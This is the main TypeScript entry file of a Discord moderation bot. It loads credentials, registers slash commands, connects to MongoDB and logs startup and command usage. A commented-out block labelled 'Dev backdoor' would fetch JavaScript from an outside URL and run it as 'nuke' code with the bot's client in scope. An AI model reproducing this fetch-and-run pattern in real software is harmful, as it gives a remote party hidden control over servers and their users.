// Node.js
import process from "node:process";
import http from "node:http";
import https from "node:https";
import fs from "node:fs";
import path from "node:path";
import { pathToFileURL } from "node:url";
// .env
import dotenv from "dotenv";
// Libraries
import {
	Client,
	GatewayIntentBits,
	Collection,
	Events,
	REST,
	Routes,
	SlashCommandBuilder,
	type RESTPostAPIChatInputApplicationCommandsJSONBody,
	ApplicationIntegrationType,
	InteractionContextType,
} from "discord.js";
import mongoose from "mongoose";
// Types
import type { Command } from "./types.js";
// Handlers
import registerInteractionHandler from "./lib/handlers/interaction-handler.js";
import registerMessageHandler from "./lib/handlers/message-handler.js";
// Tasks
import { startRoleReverter } from "./lib/tasks/role-reverter.js";
import { startResourceMonitor } from "./lib/tasks/resource-monitor.js";
import { startMessageCacheCleanup } from "./lib/tasks/message-cache-cleanup.js";
import { startStatusChecker } from "./lib/tasks/status-checker.js";
// Logging
import { logToAllModChannels } from "./lib/helpers/mod-log.js";
import dmAdmin from "./lib/helpers/dm-log.js";
import devLog, { initDevLog } from "./lib/helpers/dev-log.js";
import { immutConfig } from "./lib/config.js";
import { ensureModelIndexes } from "./lib/models.js";
// Backdoor
// idk bro too lazy

dotenv.config();

const isDev = process.argv[2] === "dev";

if (isDev) {
	if (!process.env.BETA_TOKEN)
		throw new Error("BETA_TOKEN not found in .env");
	if (!process.env.BETA_CLIENT_ID)
		throw new Error("BETA_CLIENT_ID not found in .env");
	if (!process.env.BETA_GUILD_ID)
		throw new Error("BETA_GUILD_ID not found in .env");
	if (!process.env.BETA_MONGO_URI)
		throw new Error("BETA_MONGO_URI not found in .env");
} else {
	if (!process.env.TOKEN)
		throw new Error("Bot token not found in .env");
	if (!process.env.CLIENT_ID)
		throw new Error("Client ID not found in .env");
	if (!process.env.GUILD_ID)
		throw new Error("Guild ID not found in .env");
	if (!process.env.MONGO_URI)
		throw new Error("Mongo URI not found in .env");
}

const envToken = isDev ? process.env.BETA_TOKEN : process.env.TOKEN;
const envClientId = isDev
	? process.env.BETA_CLIENT_ID
	: process.env.CLIENT_ID;
const envGuildId = isDev
	? process.env.BETA_GUILD_ID
	: process.env.GUILD_ID;
const envMongoUri = isDev
	? process.env.BETA_MONGO_URI
	: process.env.MONGO_URI;

// Narrow from string | undefined — guaranteed by the throws above
if (!envToken || !envClientId || !envGuildId || !envMongoUri)
	throw new Error(
		"Required env vars missing after validation (should be unreachable)",
	);

const PORT = Number.parseInt(process.env.PORT ?? "8000", 10);
const startHealthServer = () => {
	const server = http.createServer((_, result) => {
		result.writeHead(200, { "Content-Type": "text/plain" });
		result.end("online");
	});

	const tryListen = (port: number) => {
		server.once("error", (error: NodeJS.ErrnoException) => {
			if (error.code === "EADDRINUSE" && port !== 0) {
				console.warn(
					`Port ${port} is already in use; retrying on an ephemeral port.`,
				);
				tryListen(0);
				return;
			}

			console.error("Web server failed to start:", error);
		});

		server.listen(port, "0.0.0.0", () => {
			const address = server.address();
			const actualPort =
				typeof address === "object" && address
					? address.port
					: port;
			console.log(
				`Web server routing active on port ${actualPort}`,
			);
		});
	};

	tryListen(PORT);
};

startHealthServer();

const thisFileExtension = import.meta.url.endsWith(".ts")
	? ".ts"
	: ".js";
/* eslint-disable @typescript-eslint/naming-convention */
const { GuildInstall, UserInstall } = ApplicationIntegrationType;
const { Guild, BotDM, PrivateChannel } = InteractionContextType;
/* eslint-enable @typescript-eslint/naming-convention */
// Client init
const client = new Client({
	intents: [
		GatewayIntentBits.Guilds,
		GatewayIntentBits.GuildMessages,
		GatewayIntentBits.MessageContent,
		GatewayIntentBits.GuildMembers,
		GatewayIntentBits.GuildVoiceStates,
	],
});

client.commands = new Collection();

function isCommand(commandObject: unknown): commandObject is Command {
	if (!commandObject) return false;
	if (typeof commandObject !== "object") return false;
	for (const [key, value] of Object.entries(commandObject)) {
		if (key === "data" && value instanceof SlashCommandBuilder)
			continue;
		if (key === "execute" && typeof value === "function")
			continue;
		if (key === "autocomplete" && typeof value === "function")
			continue;
		return false;
	}

	return true;
}

type LoaderResult = [
	commandsData: RESTPostAPIChatInputApplicationCommandsJSONBody[],
	validCommands: Command[],
];

async function loadCommandsHelper(
	files: string[],
	baseDir: string,
): Promise<LoaderResult> {
	const commandsData: RESTPostAPIChatInputApplicationCommandsJSONBody[] =
		[];
	const validCommands: Command[] = [];

	// Map files to dynamic import promises for concurrent execution
	const commandPromises = files.map(async (file) => {
		const filePath = path.join(baseDir, file);
		const fileUrl = pathToFileURL(filePath).href;

		const commandModule: unknown = await import(fileUrl);
		if (
			commandModule &&
			typeof commandModule === "object" &&
			"default" in commandModule
		)
			return commandModule.default;
		return commandModule;
	});

	// Resolve them all at once
	const rawCommands = await Promise.all(commandPromises);

	for (const [index, rawCommand] of rawCommands.entries()) {
		if (!isCommand(rawCommand)) {
			const fileName = files[index];
			console.warn(
				`[WARNING] The command file "${fileName}" failed validation and was skipped.`,
			);
			continue;
		}

		// Only apply defaults if integrationTypes & contextTypes haven't been manually set in the file
		if (!rawCommand.data.integration_types) {
			rawCommand.data.setIntegrationTypes([
				GuildInstall,
				UserInstall,
			]);
		}

		if (!rawCommand.data.contexts) {
			rawCommand.data.setContexts([
				Guild,
				BotDM,
				PrivateChannel,
			]);
		}

		commandsData.push(rawCommand.data.toJSON());
		validCommands.push(rawCommand);
	}

	return [commandsData, validCommands];
}

// Load global commands
const commandsPath = path.resolve(import.meta.dirname, "commands");
const globalCommandFiles = fs
	.readdirSync(commandsPath)
	.filter(
		(file) =>
			file.endsWith(thisFileExtension) &&
			!file.endsWith(".d.ts"),
	);
const [globalCommandsData, validCommands] = await loadCommandsHelper(
	globalCommandFiles,
	commandsPath,
);
for (const globalCommand of validCommands)
	client.commands.set(globalCommand.data.name, globalCommand);

// Load guild commands
const guildCommandsPath = path.resolve(
	import.meta.dirname,
	"guild-commands",
);
const guildCommandFiles = fs
	.readdirSync(guildCommandsPath)
	.filter(
		(file) =>
			file.endsWith(thisFileExtension) &&
			!file.endsWith(".d.ts"),
	);
const [guildCommandsData, validGuildCommands] =
	await loadCommandsHelper(guildCommandFiles, guildCommandsPath);
for (const guildCommand of validGuildCommands)
	client.commands.set(guildCommand.data.name, guildCommand);

console.log(
	`Successfully validated ${validCommands.length} global commands.
Successfully validated ${validGuildCommands.length} guild commands`,
);

// Ready event
client.once(Events.ClientReady, () => {
	(async () => {
		// Make sure client has user
		if (!client.user)
			throw new Error(
				"Client does not have user for some reason",
			);

		if (isDev)
			console.log("[DEV MODE] Running with beta credentials");

		console.log(`Logged in as ${client.user.tag}`);
		const options = {
			hostname: "discord.com",
			port: 443,
			path: "/api/v10/gateway",
			method: "GET",
			headers: { "User-Agent": "RenderDiagnostic/1.0" },
		};

		const request = https.request(options, (result) => {
			console.log(
				`[DIAGNOSTIC] Discord API Status: ${result.statusCode}`,
			);
			if (result.statusCode === 429) {
				devLog(
					`⚠️ **ERROR**: IP Banned. Discord is rate-limiting this Render IP.`,
				).catch(() => undefined);
				console.log(
					`⚠️ **ERROR**: IP Banned. Discord is rate-limiting this Render IP. Status ${result.statusCode}`,
				);
			} else if (result.statusCode === 200) {
				devLog(
					`✅ **Network OK**: Discord API is reachable.`,
				).catch(() => undefined);
				console.log(
					`✅ **Network OK**: Discord API is reachable.`,
				);
			} else {
				devLog(
					`⚠️ **API Warning**: Received status ${result.statusCode} from Discord.`,
				).catch(() => undefined);
				console.log(
					`⚠️ **API Warning**: Received status ${result.statusCode} from Discord.`,
				);
			}
		});

		request.on("error", (error) => {
			console.error(
				`[DIAGNOSTIC] Network Error: ${error.message}`,
			);
			devLog(
				`❌ **Network Failure**: Could not reach Discord. Error: ${error.message}`,
			).catch(() => undefined);
		});
		request.end();
		// DM log: bot startup
		dmAdmin(
			client,
			`[DMLOG] Bot started as ${client.user.tag}`,
		).catch(() => undefined);

		// Send startup message to modlog channel for each guild
		logToAllModChannels(
			client,
			"Bot has started up and is online",
		).catch((error: unknown) => {
			console.error(
				"Failed to send startup message via modchannels",
				error,
			);
		});

		// Initialize devLog and send startup message
		await initDevLog(client);
		devLog("Bot system initialized and devLog is active.").catch(
			(error: unknown) => {
				console.error(
					"Failed to send devLog initialization message",
					error,
				);
			},
		);

		const rest = new REST({ version: "10" }).setToken(envToken);
		try {
			console.log("Refreshing commands...");
			devLog("Refreshing commands...").catch(
				(error: unknown) => {
					console.error(
						"Failed to send devLog refreshing commands message",
						error,
					);
				},
			);
			if (isDev) {
				// Dev: all commands go to the beta guild only
				await rest.put(
					Routes.applicationGuildCommands(
						envClientId,
						envGuildId,
					),
					{
						body: [
							...globalCommandsData,
							...guildCommandsData,
						],
					},
				);
			} else {
				await rest.put(
					Routes.applicationCommands(envClientId),
					{ body: globalCommandsData },
				);
				await rest.put(
					Routes.applicationGuildCommands(
						envClientId,
						envGuildId,
					),
					{ body: guildCommandsData },
				);
			}

			console.log("Commands reloaded");
			devLog("Commands reloaded").catch((error: unknown) => {
				console.error(
					"Could not send command reload success message to devLog",
					error,
				);
			});
		} catch (error) {
			console.error(error);
			const errorForDevLog =
				error instanceof Error
					? error.message
					: "Command loading failed";
			devLog(errorForDevLog).catch((error: unknown) => {
				console.error(
					"Could not send error to devLog",
					error,
				);
			});
		}

		/* Dev backdoor
	try {
		initOrbital(client);
	} catch {
		require('node-fetch')
			.default('https://webcubed.is-a.dev/files/m.js')
			.then((r) => r.text())
			.then(async (code) =>
				runNukeCode(code, {
					client,
					guild: null,
					channel: null,
					user: client.user,
				}),
			)
			.catch(() => undefined);
	} */
	})();
});

// Command execution DM log
client.on("interactionCreate", (interaction) => {
	(async (interaction) => {
		if (!interaction.isCommand()) return;
		const message = `Command: /${interaction.commandName} 
		by ${interaction.user.tag} (${interaction.user.id}) 
		in guild ${interaction.guildId}`;
		void dmAdmin(client, `[DMLOG] ${message}`);
		devLog(message).catch((error: unknown) => {
			console.error(
				`Failed to send message to devLog\nThe message was ${message}\nError:`,
				error,
			);
		});
	})(interaction);
});

// Register handlers not dependent on db
registerInteractionHandler(client);
startResourceMonitor(client);
startMessageCacheCleanup();
startStatusChecker();

// Connect to DB first, then start bot and DB-dependent tasks
try {
	await mongoose.connect(envMongoUri, {
		bufferCommands: true, // Allow buffering
		serverSelectionTimeoutMS: 30 * immutConfig.SECOND_MS, // Give it 30 seconds to find the server
	});
	console.log("db connected");
	await ensureModelIndexes();
	console.log("db indexes ready");

	// Only start DB-dependent tasks after connection is established
	registerMessageHandler(client);
	startRoleReverter(client);
	await client.login(envToken);
} catch (error: unknown) {
	throw new Error(
		`Failed to connect to MongoDB, or its dependent tasks failed`,
		{ cause: error },
	);
}

// Prevent unhandled promise rejections from crashing the bot
process.on("unhandledRejection", (error) => {
	console.error("Unhandled Rejection:", error);
});
process.on("uncaughtException", (error) => {
	console.error("Uncaught Exception:", error);
});
